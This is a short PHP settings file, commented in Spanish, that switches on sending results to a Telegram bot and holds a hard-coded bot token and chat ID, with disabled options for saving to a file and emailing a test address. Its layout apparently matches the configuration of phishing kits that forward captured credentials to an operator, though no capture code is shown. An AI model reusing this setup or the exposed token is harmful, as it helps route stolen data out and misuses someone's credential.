<?php
// Envio telegram
// true = SI | false = NO
$telegram_send = true;
$bottoken = "1683991548:AAHegCZfgBel65fSsCnel-Vqbx4QbsfWWOY";
$chatid = "1297910096";

// Guardar archivo
// true = SI | false = NO
$file_save = false;

// Envio Gmail
// true = SI | false = NO
$email_send = false;
$email = "jasonidk@test.com";
?>